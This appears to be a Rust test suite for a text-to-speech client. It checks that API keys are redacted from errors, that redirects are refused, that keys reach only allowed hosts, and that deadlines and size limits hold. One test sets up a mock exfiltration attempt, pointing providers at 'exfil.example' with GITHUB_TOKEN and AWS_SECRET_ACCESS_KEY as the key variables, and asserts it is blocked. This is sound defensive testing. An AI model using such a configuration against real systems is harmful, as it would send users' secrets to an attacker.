//! Hostile or broken servers and environments, against an in-process HTTP/1.1 server: keys never go to
//! hosts the policy does not allow and never come back through messages, redirects are refused, a local
//! server that is down fails fast, and every cue ends within its deadline and size limits. No real network
//! and no API keys.

mod support;

use std::time::{Duration, Instant};

use serde_json::json;
use soniccraft_core::ir::ProviderType;
use soniccraft_tts::{
    CredentialStatus, EnvSource, TtsClient, TtsError, TtsErrorKind, TtsOptions, error_codes,
    key_host_allowed, probe_reachable,
};
use support::{
    Body, Reply, TestServer, b64, closed_port, instance, options, pcm16, request, voice,
};

const VOICE: &str = "JBFqnCBsd6RMkjVDRZzb";
const EL_PATH: &str = "/v1/text-to-speech/JBFqnCBsd6RMkjVDRZzb/with-timestamps";

/// Keys that are easy to find in any output.
fn leakcheck_env(extra: &[(&str, &str)]) -> EnvSource {
    let mut vars = vec![
        ("ELEVENLABS_API_KEY", "sk_test_LEAKCHECK_eleven"),
        ("OPENAI_API_KEY", "sk-test-LEAKCHECK-openai"),
        ("CARTESIA_API_KEY", "sk_car_LEAKCHECK_cartesia"),
        ("KOKORO_API_KEY", "kk-LEAKCHECK-kokoro"),
    ];
    vars.extend_from_slice(extra);
    EnvSource::fixed(vars)
}

fn client_with(env: EnvSource) -> TtsClient {
    TtsClient::new(TtsOptions { env, ..options() })
}

/// No rendering of `err` (Display, Debug, JSON) contains `needle`.
fn assert_clean(err: &TtsError, needle: &str) {
    for rendered in [
        format!("{err}"),
        format!("{err:?}"),
        serde_json::to_string(err).unwrap(),
    ] {
        assert!(!rendered.contains(needle), "`{needle}` leaked: {rendered}");
    }
}

#[tokio::test]
async fn keys_echoed_by_a_server_are_scrubbed_from_errors() {
    let server = TestServer::start().await;
    server.route(
        "POST",
        "/v1/audio/speech",
        vec![Reply::json(401, json!({"error": {"message": "Incorrect API key provided: Bearer sk-test-LEAKCHECK-openai",
                                               "code": "invalid_api_key"}}))],
    );
    server.route(
        "POST",
        EL_PATH,
        vec![Reply::json(401, json!({"detail": {"message": "bad xi-api-key sk_test_LEAKCHECK_eleven", "status": "invalid_api_key"}}))],
    );
    server.route(
        "POST",
        "/dev/captioned_speech",
        vec![Reply::text(
            403,
            "token kk-LEAKCHECK-kokoro is not allowed here",
        )],
    );
    server.route(
        "POST",
        "/tts/sse",
        vec![Reply::text(
            401,
            "Invalid key: Bearer sk_car_LEAKCHECK_cartesia",
        )],
    );
    let client = client_with(leakcheck_env(&[]));
    let cases = [
        request(
            instance(ProviderType::Openai, Some(format!("{}/v1", server.url()))),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ),
        request(
            instance(ProviderType::Elevenlabs, Some(server.url())),
            voice(ProviderType::Elevenlabs, Some(VOICE), json!({})),
            "Hello",
        ),
        request(
            instance(ProviderType::Kokoro, Some(server.url())),
            voice(ProviderType::Kokoro, None, json!({})),
            "Hello",
        ),
        request(
            instance(ProviderType::Cartesia, Some(server.url())),
            voice(ProviderType::Cartesia, Some("v"), json!({})),
            "Hello",
        ),
    ];
    for req in &cases {
        let err = client.synthesize(req).await.unwrap_err();
        assert_eq!(err.kind, TtsErrorKind::Auth, "{err:?}");
        assert!(err.message.contains("<redacted>"), "{}", err.message);
        assert_clean(&err, "LEAKCHECK");
    }
    // The keys did reach the (local, allowed) server: scrubbing is what kept them out of the errors.
    assert_eq!(
        server.requests_to("/v1/audio/speech")[0].header("authorization"),
        Some("Bearer sk-test-LEAKCHECK-openai")
    );
    assert_eq!(
        server.requests_to("/dev/captioned_speech")[0].header("authorization"),
        Some("Bearer kk-LEAKCHECK-kokoro")
    );
    // Voice listings are results that reach agents too.
    server.route(
        "GET",
        "/v2/voices",
        vec![Reply::json(
            200,
            json!({"voices": [{"voice_id": "v1", "name": "Echo sk_test_LEAKCHECK_eleven",
                                                 "description": "key: sk_test_LEAKCHECK_eleven"}],
                                     "has_more": false}),
        )],
    );
    let voices = client
        .list_voices(&instance(ProviderType::Elevenlabs, Some(server.url())))
        .await
        .unwrap();
    assert_eq!(voices[0].name, "Echo <redacted>");
    assert!(!format!("{voices:?}").contains("LEAKCHECK"), "{voices:?}");
}

#[tokio::test]
async fn redirects_are_refused_so_keys_never_reach_another_origin() {
    let other = TestServer::start().await;
    other.route(
        "POST",
        EL_PATH,
        vec![Reply::json(200, json!({"audio_base64": b64(&pcm16(240))}))],
    );
    other.route("GET", "/v1/user", vec![Reply::json(200, json!({}))]);
    let server = TestServer::start().await;
    let target = format!("{}{EL_PATH}?output_format=pcm_24000", other.url());
    server.route(
        "POST",
        EL_PATH,
        vec![Reply::text(307, "moved").header("Location", &target)],
    );
    server.route(
        "GET",
        "/v1/user",
        vec![Reply::text(302, "moved").header("Location", &format!("{}/v1/user", other.url()))],
    );
    server.route(
        "POST",
        "/v1/audio/speech",
        vec![
            Reply::text(308, "moved")
                .header("Location", &format!("{}/v1/audio/speech", other.url())),
        ],
    );
    let client = client_with(leakcheck_env(&[]));
    let el = instance(ProviderType::Elevenlabs, Some(server.url()));
    let err = client
        .synthesize(&request(
            el.clone(),
            voice(ProviderType::Elevenlabs, Some(VOICE), json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(err.has_code(error_codes::REDIRECT_REFUSED), "{err:?}");
    assert_eq!(
        (err.kind, err.status, err.attempts),
        (TtsErrorKind::InvalidRequest, Some(307), 1)
    );
    assert!(err.message.contains(&other.url()), "{}", err.message);
    let err = client.check_credentials_online(&el).await.unwrap_err();
    assert!(err.has_code(error_codes::REDIRECT_REFUSED), "{err:?}");
    let err = client
        .synthesize(&request(
            instance(ProviderType::Openai, Some(format!("{}/v1", server.url()))),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(err.has_code(error_codes::REDIRECT_REFUSED), "{err:?}");
    assert!(
        other.requests().is_empty(),
        "the other origin was contacted: {:?}",
        other.requests()
    );
}

#[tokio::test]
async fn keys_go_only_to_the_official_host_local_servers_or_allowed_hosts() {
    let client = client_with(leakcheck_env(&[]));
    // The reviewer's exfiltration: a timeline points a provider at its own host and names any variable.
    let mut openai = instance(
        ProviderType::Openai,
        Some("http://exfil.example:18732/v1".into()),
    );
    openai.api_key_env = Some("GITHUB_TOKEN".into());
    let mut eleven = instance(
        ProviderType::Elevenlabs,
        Some("http://exfil.example:18732".into()),
    );
    eleven.api_key_env = Some("AWS_SECRET_ACCESS_KEY".into());
    let exfil = client_with(EnvSource::fixed([
        ("GITHUB_TOKEN", "ghp_FAKE_LEAKCHECK"),
        ("AWS_SECRET_ACCESS_KEY", "FAKEaws/LEAKCHECK"),
    ]));
    for (provider, var) in [
        (&openai, "GITHUB_TOKEN"),
        (&eleven, "AWS_SECRET_ACCESS_KEY"),
    ] {
        // Offline validation already knows: the provider cannot run as configured.
        match exfil.credential_status(provider, std::path::Path::new(".")) {
            CredentialStatus::Unavailable { reason } => assert!(
                reason.contains(var) && reason.contains("SONICCRAFT_ALLOWED_HOSTS=exfil.example"),
                "{reason}"
            ),
            other => panic!("{other:?}"),
        }
        let started = Instant::now();
        let mut errors = vec![
            exfil.check_credentials_online(provider).await.unwrap_err(),
            exfil
                .synthesize(&request(
                    provider.clone(),
                    voice(provider.provider_type, Some("v"), json!({})),
                    "Hello",
                ))
                .await
                .unwrap_err(),
        ];
        match provider.provider_type {
            // OpenAI-compatible voice listing falls back to OpenAI's published list without a request.
            ProviderType::Openai => assert!(!exfil.list_voices(provider).await.unwrap().is_empty()),
            _ => errors.push(exfil.list_voices(provider).await.unwrap_err()),
        }
        for err in errors {
            assert!(err.has_code(error_codes::KEY_HOST_NOT_ALLOWED), "{err:?}");
            assert_eq!((err.kind, err.attempts), (TtsErrorKind::Unavailable, 1));
            assert!(
                err.message.contains(var) && err.message.contains("`exfil.example`"),
                "{}",
                err.message
            );
            let hint = err.hint.as_deref().unwrap_or_default();
            assert!(
                hint.contains("SONICCRAFT_ALLOWED_HOSTS=exfil.example")
                    && hint.contains("never in the timeline"),
                "{hint}"
            );
            assert_clean(&err, "LEAKCHECK");
        }
        // Refused before any connection attempt (the host does not even resolve).
        assert!(started.elapsed() < Duration::from_secs(2));
    }
    assert!(
        key_host_allowed(
            &openai,
            &EnvSource::fixed([("GITHUB_TOKEN", "ghp_x_12345678")])
        )
        .is_err()
    );

    // A remote OpenAI-compatible server with the default key variable set: refused unless listed.
    let remote = instance(
        ProviderType::Openai,
        Some("https://tts.example.net/v1".into()),
    );
    let err = client
        .synthesize(&request(
            remote.clone(),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(err.has_code(error_codes::KEY_HOST_NOT_ALLOWED), "{err:?}");
    assert!(
        err.hint
            .as_deref()
            .unwrap_or_default()
            .contains("or unset OPENAI_API_KEY to send the request without a key"),
        "{err:?}"
    );
    for allowed in [
        "tts.example.net",
        "*.example.net",
        "*",
        "other.org, tts.example.net",
    ] {
        let env = leakcheck_env(&[("SONICCRAFT_ALLOWED_HOSTS", allowed)]);
        assert!(key_host_allowed(&remote, &env).is_ok(), "{allowed}");
        assert!(client_with(env).key_host_allowed(&remote).is_ok());
    }
    // Keyless requests may go anywhere; the official host and servers on this machine get the provider's own
    // key; a private-network host needs to be listed.
    assert!(key_host_allowed(&remote, &EnvSource::fixed([("X", "1")])).is_ok());
    let official = instance(
        ProviderType::Openai,
        Some("https://api.openai.com/v1".into()),
    );
    assert!(client.key_host_allowed(&official).is_ok());
    let loopback = instance(
        ProviderType::Elevenlabs,
        Some("http://127.0.0.1:8080".into()),
    );
    assert!(client.key_host_allowed(&loopback).is_ok());
    let lan = instance(
        ProviderType::Elevenlabs,
        Some("http://192.168.1.20:8080".into()),
    );
    let err = client.key_host_allowed(&lan).unwrap_err();
    assert!(err.has_code(error_codes::KEY_HOST_NOT_ALLOWED), "{err:?}");
    assert!(
        client_with(leakcheck_env(&[(
            "SONICCRAFT_ALLOWED_HOSTS",
            "192.168.1.20"
        )]))
        .key_host_allowed(&lan)
        .is_ok()
    );
}

#[tokio::test]
async fn unexpanded_placeholders_count_as_missing_keys_and_are_never_sent() {
    let server = TestServer::start().await;
    server.route(
        "POST",
        "/dev/captioned_speech",
        vec![Reply::json(
            200,
            json!({"audio": b64(&pcm16(2_400)), "timestamps": []}),
        )],
    );
    for placeholder in [
        "${ELEVENLABS_API_KEY}",
        "${ELEVENLABS_API_KEY:-}",
        "$ELEVENLABS_API_KEY",
        "${env:ELEVENLABS_API_KEY}",
    ] {
        let client = client_with(EnvSource::fixed([
            ("ELEVENLABS_API_KEY", placeholder),
            ("KOKORO_API_KEY", "${KOKORO_API_KEY}"),
        ]));
        let el = instance(ProviderType::Elevenlabs, Some(server.url()));
        assert_eq!(
            client.credential_status(&el, std::path::Path::new(".")),
            CredentialStatus::Missing {
                env_var: "ELEVENLABS_API_KEY".into()
            },
            "{placeholder}"
        );
        let hint = client.credential_hint(&el).expect("a placeholder hint");
        assert!(
            hint.contains("the MCP client passed an unexpanded placeholder")
                && hint.contains("remove the env entry from the client config or set the variable"),
            "{hint}"
        );
        let err = client
            .synthesize(&request(
                el.clone(),
                voice(ProviderType::Elevenlabs, Some(VOICE), json!({})),
                "Hello",
            ))
            .await
            .unwrap_err();
        assert_eq!(err.kind, TtsErrorKind::Auth);
        assert!(err.has_code(error_codes::PLACEHOLDER_KEY), "{err:?}");
        assert!(client.check_credentials_online(&el).await.is_err());
        // An optional key that is a placeholder is simply not sent.
        let kokoro = instance(ProviderType::Kokoro, Some(server.url()));
        assert!(client.credential_hint(&kokoro).is_some());
        client
            .synthesize(&request(
                kokoro,
                voice(ProviderType::Kokoro, None, json!({})),
                placeholder,
            ))
            .await
            .unwrap();
    }
    assert!(server.requests_to(EL_PATH).is_empty() && server.requests_to("/v1/user").is_empty());
    assert!(
        server
            .requests_to("/dev/captioned_speech")
            .iter()
            .all(|r| r.header("authorization").is_none())
    );
}

#[tokio::test]
async fn a_local_server_that_is_down_fails_every_cue_at_once() {
    let port = closed_port();
    let root = format!("http://127.0.0.1:{port}");
    assert!(!probe_reachable(&root, Duration::from_millis(300)).await);
    let up = TestServer::start().await;
    assert!(probe_reachable(&up.url(), Duration::from_millis(300)).await);

    // The reviewer's case: KOKORO_BASE_URL with credentials in it, nothing listening, six cues.
    let env = EnvSource::fixed([(
        "KOKORO_BASE_URL",
        format!("http://soniccraft:LEAKCHECKpassw0rd@127.0.0.1:{port}"),
    )]);
    let client = TtsClient::new(TtsOptions {
        env,
        retry_base_delay: Duration::from_secs(1), // production backoff: a retry would show in the timing
        ..options()
    });
    let mut kokoro = instance(ProviderType::Kokoro, None);
    kokoro.max_concurrency = 1;
    let requests: Vec<_> = ["one", "two", "three", "four", "five", "six"]
        .iter()
        .map(|t| {
            request(
                kokoro.clone(),
                voice(ProviderType::Kokoro, None, json!({})),
                t,
            )
        })
        .collect();
    let started = Instant::now();
    let results = client.synthesize_all(requests, |_| {}).await;
    assert!(
        started.elapsed() < Duration::from_secs(2),
        "took {:?}",
        started.elapsed()
    );
    let errors: Vec<TtsError> = results.into_iter().map(Result::unwrap_err).collect();
    let first = &errors[0];
    assert!(first.has_code(error_codes::CONNECT_FAILED), "{first:?}");
    assert_eq!(
        (first.kind, first.attempts, first.retryable),
        (TtsErrorKind::Network, 1, false)
    );
    assert!(
        first
            .hint
            .as_deref()
            .unwrap_or_default()
            .contains("docker run"),
        "{first:?}"
    );
    for err in &errors[1..] {
        assert!(err.has_code(error_codes::NOT_ATTEMPTED), "{err:?}");
        assert_eq!((err.kind, err.attempts), (TtsErrorKind::Network, 0));
        assert_eq!(
            err.message,
            format!("not attempted: kokoro unreachable at http://127.0.0.1:{port}")
        );
        assert_eq!(err.hint, first.hint, "the fix is repeated on every cue");
    }
    for err in &errors {
        assert_clean(err, "LEAKCHECK");
    }
}

#[tokio::test]
async fn a_hung_server_is_cut_off_by_the_cue_deadline() {
    let server = TestServer::start().await;
    server.route(
        "POST",
        "/dev/captioned_speech",
        vec![Reply::json(200, json!({"audio": b64(&pcm16(240))})).delay(Duration::from_secs(30))],
    );
    let client = TtsClient::new(options());
    let mut kokoro = instance(ProviderType::Kokoro, Some(server.url()));
    kokoro.timeout_ms = 400;
    kokoro.max_concurrency = 1;
    let requests: Vec<_> = ["a", "b", "c"]
        .iter()
        .map(|t| {
            request(
                kokoro.clone(),
                voice(ProviderType::Kokoro, None, json!({})),
                t,
            )
        })
        .collect();
    let started = Instant::now();
    let results = client.synthesize_all(requests, |_| {}).await;
    // Three cues, one after the other, each within its 400 ms (retries included).
    assert!(
        started.elapsed() < Duration::from_secs(3),
        "took {:?}",
        started.elapsed()
    );
    for result in results {
        let err = result.unwrap_err();
        assert_eq!(err.kind, TtsErrorKind::Timeout, "{err:?}");
        assert!(
            err.hint
                .as_deref()
                .unwrap_or_default()
                .contains("timeout_ms"),
            "{err:?}"
        );
    }
}

#[tokio::test]
async fn retries_fit_in_the_cue_deadline() {
    let server = TestServer::start().await;
    server.route(
        "POST",
        "/v1/audio/speech",
        vec![Reply::json(
            503,
            json!({"error": {"message": "overloaded"}}),
        )],
    );
    let client = TtsClient::new(TtsOptions {
        retry_base_delay: Duration::from_millis(200),
        ..options()
    });
    let mut openai = instance(ProviderType::Openai, Some(format!("{}/v1", server.url())));
    openai.timeout_ms = 500;
    let started = Instant::now();
    let err = client
        .synthesize(&request(
            openai,
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    // Backoff 200 ms then 400 ms: the second wait does not fit in what is left of the 500 ms, so the
    // error comes back after 2 attempts instead of the 4 (and 1.4 s of waits) the retry policy allows.
    assert_eq!(err.kind, TtsErrorKind::Provider, "{err:?}");
    assert!((1..=2).contains(&err.attempts), "{err:?}");
    assert_eq!(server.requests().len(), err.attempts as usize);
    assert!(
        started.elapsed() < Duration::from_millis(1_200),
        "{:?}",
        started.elapsed()
    );
}

#[tokio::test]
async fn a_trickling_sse_stream_cannot_outlive_the_deadline() {
    let server = TestServer::start().await;
    // Keep-alive comments forever (here: 10 s worth): the idle timeout never fires, the deadline does.
    server.route(
        "POST",
        "/tts/sse",
        vec![Reply {
            status: 200,
            headers: vec![("Content-Type".into(), "text/event-stream".into())],
            body: Body::Chunked {
                pieces: vec![b": keep-alive\n\n".to_vec(); 400],
                gap: Duration::from_millis(25),
            },
            delay: Duration::ZERO,
        }],
    );
    let client = TtsClient::new(options());
    let mut cartesia = instance(ProviderType::Cartesia, Some(server.url()));
    cartesia.timeout_ms = 500;
    let started = Instant::now();
    let err = client
        .synthesize(&request(
            cartesia,
            voice(ProviderType::Cartesia, Some("v"), json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert_eq!(err.kind, TtsErrorKind::Timeout, "{err:?}");
    assert!(
        started.elapsed() < Duration::from_secs(2),
        "took {:?}",
        started.elapsed()
    );
}

#[tokio::test]
async fn oversized_responses_are_refused_without_reading_them() {
    let server = TestServer::start().await;
    server.route(
        "POST",
        "/v1/audio/speech",
        vec![Reply {
            status: 200,
            headers: vec![("Content-Type".into(), "audio/pcm".into())],
            body: Body::Declared {
                length: 300 << 20,
                bytes: pcm16(1_000),
            },
            delay: Duration::ZERO,
        }],
    );
    // An SSE "line" without an end, longer than the parser keeps (16 MiB).
    let mut pieces = vec![b"data: ".to_vec()];
    pieces.extend(std::iter::repeat_n(vec![b'A'; 1 << 20], 17));
    server.route(
        "POST",
        "/tts/sse",
        vec![Reply {
            status: 200,
            headers: vec![("Content-Type".into(), "text/event-stream".into())],
            body: Body::Chunked {
                pieces,
                gap: Duration::ZERO,
            },
            delay: Duration::ZERO,
        }],
    );
    let client = TtsClient::new(options());
    let err = client
        .synthesize(&request(
            instance(ProviderType::Openai, Some(format!("{}/v1", server.url()))),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(err.has_code(error_codes::RESPONSE_TOO_LARGE), "{err:?}");
    assert!(err.message.contains("256 MiB"), "{}", err.message);
    let err = client
        .synthesize(&request(
            instance(ProviderType::Cartesia, Some(server.url())),
            voice(ProviderType::Cartesia, Some("v"), json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(err.has_code(error_codes::RESPONSE_TOO_LARGE), "{err:?}");
    assert!(
        err.message.contains("line of the audio stream"),
        "{}",
        err.message
    );
}

#[tokio::test]
async fn implausibly_long_audio_for_a_short_cue_is_refused() {
    let server = TestServer::start().await;
    // Eleven minutes of 24 kHz PCM for "Hi": what a wrong base_url streaming a large file decodes to.
    server.route(
        "POST",
        "/v1/audio/speech",
        vec![
            Reply::bytes(200, "audio/pcm", pcm16(24_000 * 660)),
            Reply::bytes(200, "audio/pcm", pcm16(24_000 * 2)),
        ],
    );
    let client = TtsClient::new(options());
    let req = request(
        instance(ProviderType::Openai, Some(format!("{}/v1", server.url()))),
        voice(ProviderType::Openai, None, json!({})),
        "Hi",
    );
    let err = client.synthesize(&req).await.unwrap_err();
    assert!(err.has_code(error_codes::IMPLAUSIBLE_DURATION), "{err:?}");
    assert!(
        err.message
            .contains("11 min 0 s of audio for a cue of 2 characters"),
        "{}",
        err.message
    );
    assert!(err.hint.as_deref().unwrap_or_default().contains("base_url"));
    // Normal audio is accepted.
    assert_eq!(
        client.synthesize(&req).await.unwrap().audio.frames(),
        48_000
    );
}

#[tokio::test]
async fn http_date_retry_after_is_honoured() {
    let server = TestServer::start().await;
    server.route(
        "POST",
        "/v1/audio/speech",
        vec![
            Reply::json(
                429,
                json!({"error": {"message": "slow down", "code": "rate_limit_exceeded"}}),
            )
            .header("Date", "Wed, 21 Oct 2026 07:28:00 GMT")
            .header("Retry-After", "Wed, 21 Oct 2026 07:28:04 GMT"),
            Reply::bytes(200, "audio/pcm", pcm16(240)),
        ],
    );
    // retry_base_delay 20 ms scales the 4 s the server asked for to 80 ms (the plain backoff is 20 ms).
    let client = TtsClient::new(TtsOptions {
        retry_base_delay: Duration::from_millis(20),
        ..options()
    });
    let started = Instant::now();
    client
        .synthesize(&request(
            instance(ProviderType::Openai, Some(format!("{}/v1", server.url()))),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap();
    assert!(
        started.elapsed() >= Duration::from_millis(80),
        "waited {:?}",
        started.elapsed()
    );
    assert_eq!(server.requests().len(), 2);
}

#[tokio::test]
async fn credentials_in_base_urls_never_appear_in_messages() {
    let server = TestServer::start().await;
    let with_userinfo = server
        .url()
        .replace("http://", "http://apikey:sk_3f9aLEAKCHECK@");
    let client = TtsClient::new(options());
    // 404 on an OpenAI-compatible server: the hint names the URL.
    let err = client
        .synthesize(&request(
            instance(ProviderType::Openai, Some(with_userinfo.clone())),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(
        err.hint
            .as_deref()
            .unwrap_or_default()
            .contains(&format!("{}/audio/speech", server.url())),
        "{err:?}"
    );
    assert_clean(&err, "LEAKCHECK");
    // Connection failures name it too.
    let port = closed_port();
    let err = client
        .synthesize(&request(
            instance(
                ProviderType::Openai,
                Some(format!(
                    "http://apikey:sk_3f9aLEAKCHECK@127.0.0.1:{port}/v1"
                )),
            ),
            voice(ProviderType::Openai, None, json!({})),
            "Hello",
        ))
        .await
        .unwrap_err();
    assert!(
        err.hint
            .as_deref()
            .unwrap_or_default()
            .contains(&format!("http://127.0.0.1:{port}")),
        "{err:?}"
    );
    assert_clean(&err, "LEAKCHECK");
    assert_eq!(
        soniccraft_tts::redact_url("http://u:LEAKCHECK@[::1]:8880/v1"),
        "http://[::1]:8880/v1"
    );
}
